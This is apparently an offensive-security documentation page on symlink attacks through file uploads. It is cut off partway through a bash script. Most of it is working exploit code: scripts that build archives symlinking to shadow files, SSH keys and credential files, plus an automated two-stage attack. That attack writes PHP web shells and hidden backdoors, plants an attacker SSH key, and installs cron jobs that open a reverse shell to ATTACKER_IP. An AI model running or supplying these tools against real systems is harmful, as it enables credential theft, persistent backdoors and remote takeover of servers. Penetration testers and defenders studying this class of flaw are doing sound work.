---
title: Symlink File Upload
description: Exploit symbolic link handling in file upload workflows to read arbitrary files, bypass directory restrictions, overwrite critical configurations, and escalate privileges through symlink injection in archives, direct upload, and race-based symlink attacks.
navigation:
  icon: i-lucide-file-symlink
  title: Symlink File Upload
---

## Attack Overview

::callout{icon="i-lucide-link"}
Symlink File Upload exploits the server's failure to detect or properly handle symbolic links within uploaded files or archives. By uploading a symlink that points to a sensitive target on the filesystem, an attacker forces the server to follow the link — reading, writing, or executing files outside the intended upload directory without using traditional path traversal sequences.
::

::card-group
  ::card
  ---
  icon: i-lucide-scan-eye
  title: Core Concept
  ---
  A symbolic link (symlink) is a filesystem object that references another file or directory. When uploaded and extracted or processed, the server follows the symlink transparently — treating the target file as if it were the uploaded file. This bypasses path-based restrictions because no `../` sequences appear in the filename itself.
  ::

  ::card
  ---
  icon: i-lucide-flame
  title: Impact
  ---
  Arbitrary File Read (credentials, keys, source code), Arbitrary File Write (web shells, config overwrite), Remote Code Execution, Privilege Escalation, Credential Theft, SSH Key Extraction, Database Credential Exfiltration, Denial of Service via critical file overwrite.
  ::

  ::card
  ---
  icon: i-lucide-target
  title: Attack Surface
  ---
  Archive upload and extraction (ZIP, TAR, 7z, RAR), backup restore endpoints, plugin/theme installers, document importers, CI/CD artifact upload, container image layer manipulation, package managers, firmware upload, CMS media importers.
  ::

  ::card
  ---
  icon: i-lucide-shield-alert
  title: Why It Works
  ---
  Most upload validators check filenames, extensions, MIME types, and content — but never verify whether a file inside an archive is a symbolic link. Archive extraction libraries (`unzip`, `tar`, `zipfile`, `Archive::Zip`) preserve symlinks by default, silently creating them on the server filesystem.
  ::
::

## Symlink Attack Patterns

::accordion
  :::accordion-item{icon="i-lucide-archive" label="Pattern 1 — Symlink Inside Archive (Most Common)"}
  ```
  Attack Flow:
  ──────────────────────────────────────────────────────
  1. Attacker creates symlink: link.txt → /etc/passwd
  2. Attacker adds symlink to ZIP/TAR archive
  3. Archive uploaded to server extract endpoint
  4. Server extracts archive preserving symlinks
  5. Server serves extracted files via web
  6. Attacker accesses link.txt → reads /etc/passwd
  ──────────────────────────────────────────────────────
  
  Key: The archive format preserves the symlink metadata.
  On extraction, the OS creates a real symlink on disk.
  Web server follows symlink and returns target content.
  ```
  :::

  :::accordion-item{icon="i-lucide-layers" label="Pattern 2 — Two-Stage Symlink Attack"}
  ```
  Attack Flow:
  ──────────────────────────────────────────────────────
  Stage 1: Upload archive with symlink to target directory
    link_dir → /var/www/html/
    Extracted to: /uploads/link_dir → /var/www/html/
  
  Stage 2: Upload archive with shell through the symlink
    link_dir/shell.php (file, not symlink)
    Extracted to: /uploads/link_dir/shell.php
    Actual write: /var/www/html/shell.php (via symlink)
  ──────────────────────────────────────────────────────
  
  Stage 1 creates the symlink bridge.
  Stage 2 writes through it to arbitrary locations.
  ```
  :::

  :::accordion-item{icon="i-lucide-rotate-cw" label="Pattern 3 — Symlink Race Condition"}
  ```
  Attack Flow:
  ──────────────────────────────────────────────────────
  1. Upload legitimate file → server stores at /uploads/file.txt
  2. Race: Replace /uploads/file.txt with symlink to /etc/shadow
  3. Server reads /uploads/file.txt for processing
  4. Server follows symlink → reads /etc/shadow
  5. Response contains shadow file contents
  ──────────────────────────────────────────────────────
  
  Requires: Ability to create symlinks in upload dir
  (e.g., via previous symlink archive extraction)
  ```
  :::

  :::accordion-item{icon="i-lucide-upload" label="Pattern 4 — Direct Symlink Upload"}
  ```
  Attack Flow:
  ──────────────────────────────────────────────────────
  1. PUT /api/files/link.txt HTTP/1.1
     X-Symlink-Target: /etc/passwd
  
  2. Or: WebDAV MKCOL/PUT with symlink properties
  
  3. Or: Git repository with symlinks pushed to server
  ──────────────────────────────────────────────────────
  
  Some APIs and protocols support creating symlinks directly
  without archive extraction.
  ```
  :::

  :::accordion-item{icon="i-lucide-container" label="Pattern 5 — Container/Layer Symlink"}
  ```
  Attack Flow:
  ──────────────────────────────────────────────────────
  1. Craft Docker image layer with symlink
     /app/config → /etc/shadow
  
  2. Push to registry or upload as artifact
  
  3. Server pulls/extracts image
  
  4. Application reads /app/config → gets /etc/shadow
  ──────────────────────────────────────────────────────
  
  Affects: Docker registries, OCI artifact stores,
  CI/CD pipeline artifact handling, Helm chart uploads.
  ```
  :::
::

## Reconnaissance

### Identify Archive Processing Endpoints

::tabs
  :::tabs-item{icon="i-lucide-search" label="Endpoint Discovery"}
  ```bash
  # Discover endpoints that accept archives
  ffuf -u https://target.com/FUZZ -w - -mc 200,301,302,405 << 'EOF'
  upload
  import
  restore
  extract
  unzip
  decompress
  api/upload
  api/import
  api/restore
  api/extract
  api/plugins/install
  api/themes/upload
  api/packages/upload
  api/artifacts/upload
  admin/import
  admin/restore
  admin/backup/restore
  admin/plugins
  admin/themes
  admin/upload
  backup/restore
  deploy
  api/deploy
  api/v1/files
  api/v1/import
  api/v2/upload
  media/import
  content/import
  documents/import
  data/import
  EOF
  
  # Test which endpoints accept archive Content-Types
  for endpoint in upload import restore extract api/upload api/import; do
    for ctype in "application/zip" "application/x-tar" "application/gzip" "application/x-7z-compressed"; do
      code=$(curl -s -o /dev/null -w "%{http_code}" \
        -X POST "https://target.com/${endpoint}" \
        -H "Content-Type: ${ctype}" \
        -H "Cookie: session=SESS" \
        -d "test" 2>/dev/null)
      [ "$code" != "404" ] && echo "[${code}] ${endpoint} accepts ${ctype}"
    done
  done
  ```
  :::

  :::tabs-item{icon="i-lucide-file-archive" label="Archive Format Testing"}
  ```bash
  # Create test archives in different formats
  echo "ARCHIVE_TEST" > test_file.txt
  
  # ZIP
  zip test.zip test_file.txt
  # TAR
  tar cf test.tar test_file.txt
  # TAR.GZ
  tar czf test.tar.gz test_file.txt
  # TAR.BZ2
  tar cjf test.tar.bz2 test_file.txt
  # 7z
  7z a test.7z test_file.txt
  
  # Test which formats are accepted
  for archive in test.zip test.tar test.tar.gz test.tar.bz2 test.7z; do
    ext="${archive##*.}"
    code=$(curl -s -o /dev/null -w "%{http_code}" \
      -X POST https://target.com/upload \
      -F "file=@${archive};filename=${archive}" \
      -H "Cookie: session=SESS")
    echo "${archive} -> HTTP ${code}"
  done
  
  # Check if archives are auto-extracted
  for archive in test.zip test.tar test.tar.gz; do
    curl -s -X POST https://target.com/upload \
      -F "file=@${archive};filename=${archive}" \
      -H "Cookie: session=SESS" > /dev/null
    
    # Check for extracted file
    for dir in uploads media files static extracted; do
      code=$(curl -s -o /dev/null -w "%{http_code}" \
        "https://target.com/${dir}/test_file.txt")
      [ "$code" = "200" ] && echo "[+] ${archive} extracted to /${dir}/"
    done
  done
  ```
  :::

  :::tabs-item{icon="i-lucide-settings" label="Symlink Preservation Test"}
  ```bash
  # Test if server preserves symlinks during extraction
  
  # Create test symlink archive
  ln -sf /etc/hostname symlink_test
  tar czf symlink_test.tar.gz symlink_test
  # Or with zip
  zip --symlinks symlink_test.zip symlink_test
  rm symlink_test
  
  # Upload and check if symlink was followed
  curl -s -X POST https://target.com/upload \
    -F "file=@symlink_test.tar.gz;filename=symlink_test.tar.gz" \
    -H "Cookie: session=SESS"
  
  # Try to read the symlink target
  for dir in uploads media files static extracted tmp; do
    result=$(curl -s "https://target.com/${dir}/symlink_test")
    if [ -n "$result" ] && [ "$result" != "404" ]; then
      echo "[+] Symlink followed at /${dir}/symlink_test"
      echo "[+] Content: ${result}"
    fi
  done
  
  # Verify: should contain hostname, not "symlink_test" text
  ```
  :::
::

### Identify Extraction Library

::code-group
```bash [Fingerprint via Error Messages]
# Upload invalid archive to trigger error messages
echo "NOT_AN_ARCHIVE" > fake.zip
curl -s -X POST https://target.com/upload \
  -F "file=@fake.zip;filename=fake.zip" \
  -H "Cookie: session=SESS" | tee /tmp/archive_error.txt

# Look for library identifiers
grep -iE "zipfile|tarfile|archive|extract|unzip|decompress|shutil|adm-zip|yauzl|archiver|rubyzip|minizip|libarchive|java\.util\.zip|commons-compress|zip4j" /tmp/archive_error.txt

# Common library signatures in errors:
# Python: "zipfile.BadZipFile" / "tarfile.TarError"
# Node.js: "adm-zip" / "yauzl" / "node-tar"
# PHP: "ZipArchive" / "PharData"
# Java: "java.util.zip.ZipException" / "commons-compress"
# Ruby: "Zip::Error" / "rubyzip"

# Upload corrupted archive variants
dd if=/dev/urandom bs=100 count=1 > corrupt.zip 2>/dev/null
printf 'PK\x03\x04CORRUPTED' > partial.zip
printf '\x1f\x8b\x08CORRUPTED' > corrupt.tar.gz

for f in corrupt.zip partial.zip corrupt.tar.gz; do
  echo "=== ${f} ==="
  curl -s -X POST https://target.com/upload \
    -F "file=@${f};filename=${f}" \
    -H "Cookie: session=SESS" | head -5
  echo ""
done
```

```bash [Behavioral Fingerprinting]
# Different libraries handle symlinks differently
# Test behaviors to identify the library

# Test 1: Does it extract symlinks at all?
ln -sf /etc/hostname test_symlink
tar czf behavior_test.tar.gz test_symlink
rm test_symlink

curl -s -X POST https://target.com/upload \
  -F "file=@behavior_test.tar.gz" \
  -H "Cookie: session=SESS"

# Test 2: Does it follow directory symlinks?
mkdir -p testdir
ln -sf /etc dirlink
tar czf dirlink_test.tar.gz dirlink
rm dirlink

curl -s -X POST https://target.com/upload \
  -F "file=@dirlink_test.tar.gz" \
  -H "Cookie: session=SESS"

# Test 3: Does it handle absolute vs relative symlinks differently?
ln -sf /etc/passwd absolute_link
ln -sf ../../../../etc/passwd relative_link
tar czf link_types.tar.gz absolute_link relative_link
rm absolute_link relative_link

curl -s -X POST https://target.com/upload \
  -F "file=@link_types.tar.gz" \
  -H "Cookie: session=SESS"
```
::

## Archive Symlink Crafting

### TAR Archives with Symlinks

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Basic TAR Symlinks"}
  ```bash
  # Create symlinks pointing to sensitive files
  ln -sf /etc/passwd link_passwd
  ln -sf /etc/shadow link_shadow
  ln -sf /etc/hosts link_hosts
  ln -sf /proc/self/environ link_environ
  ln -sf /root/.ssh/id_rsa link_sshkey
  ln -sf /root/.ssh/authorized_keys link_authkeys
  ln -sf /var/www/html/.env link_env
  ln -sf /var/www/html/wp-config.php link_wpconfig
  ln -sf /home/user/.bash_history link_history
  
  # Create tar preserving symlinks (default behavior)
  tar czf symlink_read.tar.gz \
    link_passwd link_shadow link_hosts link_environ \
    link_sshkey link_authkeys link_env link_wpconfig link_history
  
  # Verify symlinks are preserved in archive
  tar tvf symlink_read.tar.gz
  # Output shows 'l' flag: lrwxrwxrwx ... link_passwd -> /etc/passwd
  
  # Cleanup local symlinks
  rm -f link_passwd link_shadow link_hosts link_environ \
    link_sshkey link_authkeys link_env link_wpconfig link_history
  
  # Upload
  curl -X POST https://target.com/upload \
    -F "file=@symlink_read.tar.gz;filename=backup.tar.gz" \
    -H "Cookie: session=SESS"
  
  # Read extracted symlink targets
  for link in link_passwd link_shadow link_hosts link_environ \
    link_sshkey link_authkeys link_env link_wpconfig link_history; do
    echo "=== ${link} ==="
    curl -s "https://target.com/uploads/${link}"
    echo -e "\n"
  done
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Python TAR Crafting"}
  ```python
  #!/usr/bin/env python3
  """Craft TAR archive with symlinks for arbitrary file read"""
  
  import tarfile
  import io
  import sys
  import os
  
  def create_symlink_tar(output_file, targets):
      """
      Create tar.gz with symlinks to target files.
      targets: dict of {link_name: target_path}
      """
      with tarfile.open(output_file, 'w:gz') as tar:
          for link_name, target_path in targets.items():
              info = tarfile.TarInfo(name=link_name)
              info.type = tarfile.SYMTYPE
              info.linkname = target_path
              info.size = 0
              tar.addfile(info)
              print(f"  [+] {link_name} -> {target_path}")
      
      print(f"\n[+] Created: {output_file}")
      print(f"[+] Contains {len(targets)} symlink(s)")
  
  # Target sensitive files
  targets = {
      # System credentials
      "etc_passwd":       "/etc/passwd",
      "etc_shadow":       "/etc/shadow",
      "etc_group":        "/etc/group",
      
      # SSH keys
      "root_id_rsa":      "/root/.ssh/id_rsa",
      "root_id_ed25519":  "/root/.ssh/id_ed25519",
      "root_authorized":  "/root/.ssh/authorized_keys",
      "root_known_hosts": "/root/.ssh/known_hosts",
      
      # Application secrets
      "dot_env":          "/var/www/html/.env",
      "wp_config":        "/var/www/html/wp-config.php",
      "db_config":        "/var/www/html/config/database.yml",
      "app_secrets":      "/var/www/html/config/secrets.yml",
      "laravel_env":      "/var/www/html/.env",
      
      # Process info
      "proc_environ":     "/proc/self/environ",
      "proc_cmdline":     "/proc/self/cmdline",
      "proc_mounts":      "/proc/self/mounts",
      
      # Cloud metadata
      "aws_credentials":  "/home/ubuntu/.aws/credentials",
      "gcp_credentials":  "/home/user/.config/gcloud/credentials.db",
      
      # History files
      "bash_history":     "/root/.bash_history",
      "mysql_history":    "/root/.mysql_history",
      
      # Network config
      "hosts":            "/etc/hosts",
      "resolv_conf":      "/etc/resolv.conf",
      "hostname":         "/etc/hostname",
  }
  
  create_symlink_tar("symlink_exfil.tar.gz", targets)
  ```
  :::

  :::tabs-item{icon="i-lucide-folder-tree" label="Directory Symlinks"}
  ```bash
  # Symlink to entire directories for browsing
  ln -sf /etc etc_link
  ln -sf /root root_link
  ln -sf /var/www/html webroot_link
  ln -sf /home home_link
  ln -sf /proc proc_link
  ln -sf /var/log logs_link
  ln -sf /tmp tmp_link
  
  tar czf dir_symlinks.tar.gz \
    etc_link root_link webroot_link home_link proc_link logs_link tmp_link
  
  rm -f etc_link root_link webroot_link home_link proc_link logs_link tmp_link
  
  # Upload
  curl -X POST https://target.com/upload \
    -F "file=@dir_symlinks.tar.gz;filename=project.tar.gz" \
    -H "Cookie: session=SESS"
  
  # Browse through directory symlinks
  curl -s "https://target.com/uploads/etc_link/passwd"
  curl -s "https://target.com/uploads/etc_link/shadow"
  curl -s "https://target.com/uploads/root_link/.ssh/id_rsa"
  curl -s "https://target.com/uploads/root_link/.bash_history"
  curl -s "https://target.com/uploads/webroot_link/.env"
  curl -s "https://target.com/uploads/webroot_link/wp-config.php"
  curl -s "https://target.com/uploads/home_link/"
  curl -s "https://target.com/uploads/logs_link/apache2/access.log"
  curl -s "https://target.com/uploads/proc_link/self/environ"
  
  # Enumerate directory contents through symlink
  curl -s "https://target.com/uploads/etc_link/" | grep -oE 'href="[^"]*"'
  curl -s "https://target.com/uploads/root_link/" | grep -oE 'href="[^"]*"'
  ```
  :::
::

### ZIP Archives with Symlinks

::tabs
  :::tabs-item{icon="i-lucide-file-archive" label="zip --symlinks"}
  ```bash
  # Create symlinks
  ln -sf /etc/passwd passwd_link
  ln -sf /etc/shadow shadow_link
  ln -sf /root/.ssh/id_rsa key_link
  ln -sf /var/www/html/.env env_link
  ln -sf /proc/self/environ environ_link
  
  # IMPORTANT: Must use --symlinks flag
  # Without it, zip follows symlinks and stores target content
  zip --symlinks symlink_attack.zip \
    passwd_link shadow_link key_link env_link environ_link
  
  # Verify symlinks in ZIP
  zipinfo symlink_attack.zip
  # Look for 'l' in permissions: lrwxrwxrwx
  unzip -l symlink_attack.zip
  
  # Cleanup
  rm -f passwd_link shadow_link key_link env_link environ_link
  
  # Upload
  curl -X POST https://target.com/upload \
    -F "file=@symlink_attack.zip;filename=project.zip" \
    -H "Cookie: session=SESS"
  
  # Access symlinked files
  curl -s "https://target.com/uploads/passwd_link"
  curl -s "https://target.com/uploads/shadow_link"
  curl -s "https://target.com/uploads/key_link"
  curl -s "https://target.com/uploads/env_link"
  curl -s "https://target.com/uploads/environ_link"
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Python zipfile Crafting"}
  ```python
  #!/usr/bin/env python3
  """Craft ZIP with symlinks using zipfile module"""
  
  import zipfile
  import struct
  import os
  import stat
  import sys
  
  def create_symlink_zip(output_file, symlinks):
      """
      Create ZIP containing symbolic links.
      symlinks: dict of {link_name: target_path}
      
      ZIP stores symlinks via:
      - External attributes with symlink flag
      - File content = symlink target path
      """
      with zipfile.ZipFile(output_file, 'w') as zf:
          for link_name, target_path in symlinks.items():
              # Create ZipInfo for symlink
              info = zipfile.ZipInfo(link_name)
              
              # Set Unix symlink attributes
              # 0xA000 = symlink flag in Unix external attributes
              info.create_system = 3  # Unix
              unix_attrs = (stat.S_IFLNK | 0o777) << 16
              info.external_attr = unix_attrs
              
              # Symlink target is stored as file content
              zf.writestr(info, target_path)
              print(f"  [+] {link_name} -> {target_path}")
      
      print(f"\n[+] Created: {output_file}")
  
  # Sensitive file targets
  symlinks = {
      "passwd.txt":           "/etc/passwd",
      "shadow.txt":           "/etc/shadow",
      "ssh_key":              "/root/.ssh/id_rsa",
      "ssh_key_ed25519":      "/root/.ssh/id_ed25519",
      "authorized_keys":      "/root/.ssh/authorized_keys",
      "app_env":              "/var/www/html/.env",
      "wp_config":            "/var/www/html/wp-config.php",
      "proc_environ":         "/proc/self/environ",
      "proc_cmdline":         "/proc/self/cmdline",
      "bash_history":         "/root/.bash_history",
      "aws_creds":            "/root/.aws/credentials",
      "docker_env":           "/proc/1/environ",
      "hosts":                "/etc/hosts",
      "crontab":              "/etc/crontab",
      "nginx_conf":           "/etc/nginx/nginx.conf",
      "apache_conf":          "/etc/apache2/apache2.conf",
  }
  
  create_symlink_zip("symlink_zip.zip", symlinks)
  ```
  :::

  :::tabs-item{icon="i-lucide-file-code" label="Raw ZIP Binary Crafting"}
  ```python
  #!/usr/bin/env python3
  """
  Low-level ZIP symlink crafting for maximum compatibility.
  Manually constructs ZIP binary to ensure symlink metadata is correct.
  """
  
  import struct
  import time
  import sys
  
  def create_raw_symlink_zip(filename, link_name, target_path):
      """Build ZIP binary from scratch with symlink entry"""
      
      link_name_bytes = link_name.encode('utf-8')
      target_bytes = target_path.encode('utf-8')
      
      # DOS date/time
      now = time.localtime()
      dos_time = (now.tm_sec // 2) | (now.tm_min << 5) | (now.tm_hour << 11)
      dos_date = now.tm_mday | ((now.tm_mon) << 5) | ((now.tm_year - 1980) << 9)
      
      # CRC32 of symlink target
      import zlib
      crc = zlib.crc32(target_bytes) & 0xFFFFFFFF
      
      # Local file header
      local_header = struct.pack('<IHHHHHIIIHH',
          0x04034b50,          # Signature
          20,                   # Version needed
          0,                    # Flags
          0,                    # Compression (stored)
          dos_time,             # Mod time
          dos_date,             # Mod date
          crc,                  # CRC-32
          len(target_bytes),    # Compressed size
          len(target_bytes),    # Uncompressed size
          len(link_name_bytes), # Filename length
          0                     # Extra field length
      )
      local_header += link_name_bytes
      local_header += target_bytes
      
      # Central directory entry
      # External attributes: Unix symlink (0xA1FF << 16)
      unix_symlink_attr = 0xA1FF0000
      
      cd_entry = struct.pack('<IHHHHHHIIIHHHHHII',
          0x02014b50,          # Signature
          0x0314,              # Version made by (Unix, 2.0)
          20,                   # Version needed
          0,                    # Flags
          0,                    # Compression
          dos_time,             # Mod time
          dos_date,             # Mod date
          crc,                  # CRC-32
          len(target_bytes),    # Compressed size
          len(target_bytes),    # Uncompressed size
          len(link_name_bytes), # Filename length
          0,                    # Extra field length
          0,                    # Comment length
          0,                    # Disk number start
          0,                    # Internal attributes
          unix_symlink_attr,    # External attributes (SYMLINK)
          0                     # Offset of local header
      )
      cd_entry += link_name_bytes
      
      # End of central directory
      eocd = struct.pack('<IHHHHIIH',
          0x06054b50,           # Signature
          0,                     # Disk number
          0,                     # CD start disk
          1,                     # CD entries on disk
          1,                     # Total CD entries
          len(cd_entry),         # CD size
          len(local_header),     # CD offset
          0                      # Comment length
      )
      
      with open(filename, 'wb') as f:
          f.write(local_header + cd_entry + eocd)
      
      print(f"[+] Created {filename}: {link_name} -> {target_path}")
  
  create_raw_symlink_zip("raw_symlink.zip", "secret.txt", "/etc/passwd")
  ```
  :::
::

### Specialized Archive Formats

::code-group
```bash [7z with Symlinks]
# 7-Zip preserves symlinks on Linux
ln -sf /etc/passwd link_passwd
ln -sf /root/.ssh/id_rsa link_key

# Create 7z preserving symlinks
7z a -snl symlink.7z link_passwd link_key
# -snl: store symlinks as links

# Verify
7z l symlink.7z

rm -f link_passwd link_key

# Upload
curl -X POST https://target.com/upload \
  -F "file=@symlink.7z;filename=archive.7z" \
  -H "Cookie: session=SESS"
```

```bash [CPIO with Symlinks]
# CPIO archives can contain symlinks
ln -sf /etc/passwd cpio_link

# Create CPIO
echo "cpio_link" | cpio -o > symlink.cpio

# Or with find
find . -name "cpio_link" | cpio -o > symlink.cpio

# Gzip it
gzip symlink.cpio

rm -f cpio_link

# Upload
curl -X POST https://target.com/upload \
  -F "file=@symlink.cpio.gz;filename=data.cpio.gz" \
  -H "Cookie: session=SESS"
```

```bash [RPM/DEB with Symlinks]
# Craft RPM or DEB package with symlinks
# These are archive formats that may be processed by package managers

# DEB package (ar + tar.gz)
mkdir -p pkg/DEBIAN
cat > pkg/DEBIAN/control << 'EOF'
Package: symlink-exploit
Version: 1.0
Architecture: all
Maintainer: attacker
Description: Exploit package
EOF

mkdir -p pkg/var/www/html
ln -sf /etc/passwd pkg/var/www/html/passwd_link
ln -sf /root/.ssh/id_rsa pkg/var/www/html/key_link

dpkg-deb --build pkg symlink_exploit.deb

rm -rf pkg

# Upload to package management endpoint
curl -X POST https://target.com/api/packages/upload \
  -F "file=@symlink_exploit.deb" \
  -H "Cookie: session=SESS"
```

```bash [JAR/WAR with Symlinks]
# Java archives are ZIP-based
# Create JAR with symlinks using Python

python3 << 'PYEOF'
import zipfile, stat

with zipfile.ZipFile("symlink.war", "w") as zf:
    # Normal web.xml
    zf.writestr("WEB-INF/web.xml", """<?xml version="1.0"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee" version="3.1">
</web-app>""")
    
    # Symlink to sensitive file
    info = zipfile.ZipInfo("config.txt")
    info.create_system = 3
    info.external_attr = (stat.S_IFLNK | 0o777) << 16
    zf.writestr(info, "/etc/passwd")
    
    info2 = zipfile.ZipInfo("db_credentials")
    info2.create_system = 3
    info2.external_attr = (stat.S_IFLNK | 0o777) << 16
    zf.writestr(info2, "/var/www/html/.env")

print("[+] Created symlink.war")
PYEOF

curl -X POST https://target.com/api/deploy \
  -F "file=@symlink.war" \
  -H "Cookie: session=SESS"
```
::

## Two-Stage Symlink Write Attack

### Stage 1 — Plant Directory Symlink

::warning{icon="i-lucide-alert-triangle"}
The two-stage attack is the most powerful symlink technique. Stage 1 creates a symlink pointing to the target directory. Stage 2 writes files **through** the symlink, effectively writing to any location on the filesystem.
::

::steps{level="4"}

#### Create Archive with Directory Symlink

```bash
# Stage 1: Create symlink pointing to web root
ln -sf /var/www/html webroot
tar czf stage1.tar.gz webroot
rm webroot

# Verify
tar tvf stage1.tar.gz
# lrwxrwxrwx 0/0  0 ... webroot -> /var/www/html

# Upload Stage 1
curl -X POST https://target.com/upload \
  -F "file=@stage1.tar.gz;filename=project.tar.gz" \
  -H "Cookie: session=SESS"

# Verify symlink was created
curl -s "https://target.com/uploads/webroot/" | head -20
# Should show web root directory listing or index page
```

#### Create Archive with Shell Written Through Symlink

```bash
# Stage 2: File written through the symlink
# The path webroot/ is now a symlink to /var/www/html/
# So webroot/shell.php → /var/www/html/shell.php

mkdir -p webroot
echo '<?php echo "SYMLINK_WRITE_SUCCESS"; system($_GET["cmd"]); ?>' > webroot/shell.php

tar czf stage2.tar.gz webroot/shell.php
rm -rf webroot

# Upload Stage 2
curl -X POST https://target.com/upload \
  -F "file=@stage2.tar.gz;filename=update.tar.gz" \
  -H "Cookie: session=SESS"
```

#### Access the Shell at the Symlinked Location

```bash
# Shell was written to /var/www/html/shell.php via the symlink
curl "https://target.com/shell.php?cmd=id"
curl "https://target.com/shell.php?cmd=whoami"
curl "https://target.com/shell.php?cmd=cat+/etc/passwd"
```

::

### Multi-Target Two-Stage Attack

::tabs
  :::tabs-item{icon="i-lucide-layers" label="Python Automated Two-Stage"}
  ```python
  #!/usr/bin/env python3
  """
  Automated two-stage symlink write attack.
  Stage 1: Plant directory symlinks
  Stage 2: Write payloads through symlinks
  """
  
  import tarfile
  import os
  import sys
  import requests
  import time
  
  class TwoStageSymlink:
      def __init__(self, target, upload_path, extract_path, cookie):
          self.target = target.rstrip('/')
          self.upload_url = f"{self.target}{upload_path}"
          self.extract_base = f"{self.target}{extract_path}"
          self.session = requests.Session()
          self.session.headers['Cookie'] = cookie
          self.session.verify = False
      
      def create_stage1(self, symlinks):
          """Create archive with directory symlinks"""
          filename = "/tmp/stage1_symlink.tar.gz"
          with tarfile.open(filename, 'w:gz') as tar:
              for link_name, target_path in symlinks.items():
                  info = tarfile.TarInfo(name=link_name)
                  info.type = tarfile.SYMTYPE
                  info.linkname = target_path
                  tar.addfile(info)
                  print(f"  [Stage1] {link_name} -> {target_path}")
          return filename
      
      def create_stage2(self, files):
          """Create archive with files to write through symlinks"""
          filename = "/tmp/stage2_payload.tar.gz"
          with tarfile.open(filename, 'w:gz') as tar:
              for file_path, content in files.items():
                  info = tarfile.TarInfo(name=file_path)
                  info.size = len(content)
                  info.mode = 0o644
                  from io import BytesIO
                  tar.addfile(info, BytesIO(content.encode()))
                  print(f"  [Stage2] Writing: {file_path}")
          return filename
      
      def upload(self, archive_path, upload_name):
          """Upload archive to server"""
          with open(archive_path, 'rb') as f:
              r = self.session.post(
                  self.upload_url,
                  files={'file': (upload_name, f, 'application/gzip')}
              )
          return r.status_code
      
      def exploit(self):
          print("[*] === Stage 1: Planting directory symlinks ===\n")
          
          stage1_symlinks = {
              "webroot_link":  "/var/www/html",
              "etc_link":      "/etc",
              "ssh_link":      "/root/.ssh",
              "cron_link":     "/etc/cron.d",
              "tmp_link":      "/tmp",
          }
          
          s1_file = self.create_stage1(stage1_symlinks)
          status = self.upload(s1_file, "assets.tar.gz")
          print(f"\n[*] Stage 1 upload: HTTP {status}")
          
          # Verify symlinks
          time.sleep(2)
          for link_name in stage1_symlinks:
              r = self.session.get(f"{self.extract_base}/{link_name}/")
              if r.status_code != 404:
                  print(f"  [+] Symlink active: {link_name}/ -> HTTP {r.status_code}")
          
          print("\n[*] === Stage 2: Writing payloads through symlinks ===\n")
          
          shell = '<?php echo "TWO_STAGE_SYMLINK_RCE"; system($_GET["cmd"]); ?>'
          backdoor = '<?php system($_GET["c"]); ?>'
          ssh_key = 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA... attacker@box'
          cron_job = '* * * * * root /bin/bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"\n'
          
          stage2_files = {
              "webroot_link/shell.php":        shell,
              "webroot_link/.cache.php":        backdoor,
              "webroot_link/uploads/.thumb.php": backdoor,
              "ssh_link/authorized_keys":       ssh_key,
              "cron_link/maintenance":          cron_job,
          }
          
          s2_file = self.create_stage2(stage2_files)
          status = self.upload(s2_file, "update.tar.gz")
          print(f"\n[*] Stage 2 upload: HTTP {status}")
          
          # Verify RCE
          time.sleep(2)
          print("\n[*] === Verifying exploitation ===\n")
          
          r = self.session.get(f"{self.target}/shell.php", params={'cmd': 'id'})
          if 'TWO_STAGE_SYMLINK_RCE' in r.text:
              print(f"[+] RCE CONFIRMED: {self.target}/shell.php")
              print(f"[+] Output: {r.text[:300]}")
          else:
              print("[-] Direct shell not accessible, checking alternatives...")
              for path in ['.cache.php', 'uploads/.thumb.php']:
                  r = self.session.get(f"{self.target}/{path}", params={'cmd': 'id'})
                  if r.status_code == 200 and 'uid=' in r.text:
                      print(f"[+] Backdoor active: {self.target}/{path}")
  
  if __name__ == '__main__':
      exploit = TwoStageSymlink(
          target=sys.argv[1],
          upload_path=sys.argv[2],
          extract_path=sys.argv[3],
          cookie=sys.argv[4]
      )
      exploit.exploit()
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Bash Two-Stage"}
  ```bash
  #!/bin/bash
  # two_stage_symlink.sh
  
  TARGET="https://target.com"
  UPLOAD_EP="/upload"
  ACCESS_BASE="/uploads"
  COOKIE="session=YOUR_SESSION"
  ATTACKER_IP="10.10.14.1"
  
  echo "[*] Stage 1: Creating directory symlink archive..."
  
  WORKDIR=$(mktemp -d)
  cd "$WORKDIR"
  
  # Create directory symlinks
  ln -sf /var/www/html webroot
  ln -sf /root/.ssh ssh_root
  ln -sf /etc/cron.d crondir
  
  tar czf stage1.tar.gz webroot ssh_root crondir
  rm -f webroot ssh_root crondir
  
  echo "[*] Uploading Stage 1..."
  curl -s -X POST "${TARGET}${UPLOAD_EP}" \
    -F "file=@stage1.tar.gz;filename=project.tar.gz" \
    -H "Cookie: ${COOKIE}" -o /dev/null
  
  sleep 2
  
  # Verify symlinks
  for link in webroot ssh_root crondir; do
    code=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET}${ACCESS_BASE}/${link}/")
    echo "  ${link}/ -> HTTP ${code}"
  done
  
  echo "[*] Stage 2: Writing payloads through symlinks..."
  
  # Create payload files through symlink directories
  mkdir -p webroot ssh_root crondir
  
  echo '<?php echo "STAGE2_RCE"; system($_GET["cmd"]); ?>' > webroot/cmd.php
  echo '<?php system($_GET["c"]); ?>' > webroot/.maintenance.php
  
  # SSH key
  ssh-keygen -t ed25519 -f /tmp/symlink_key -N "" -q 2>/dev/null
  cp /tmp/symlink_key.pub ssh_root/authorized_keys
  
  # Cron reverse shell
  echo "* * * * * root bash -c 'bash -i >& /dev/tcp/${ATTACKER_IP}/4444 0>&1'" > crondir/update
  
  tar czf stage2.tar.gz webroot/ ssh_root/ crondir/
  rm -rf webroot ssh_root crondir
  
  curl -s -X POST "${TARGET}${UPLOAD_EP}" \
    -F "file=@stage2.tar.gz;filename=update.tar.gz" \
    -H "Cookie: ${COOKIE}" -o /dev/null
  
  sleep 2
  
  echo "[*] Verifying exploitation..."
  result=$(curl -s "${TARGET}/cmd.php?cmd=id")
  if echo "$result" | grep -q "STAGE2_RCE"; then
    echo "[+] RCE CONFIRMED: ${TARGET}/cmd.php"
    echo "[+] $(echo "$result" | grep -o 'uid=[^ ]*')"
    
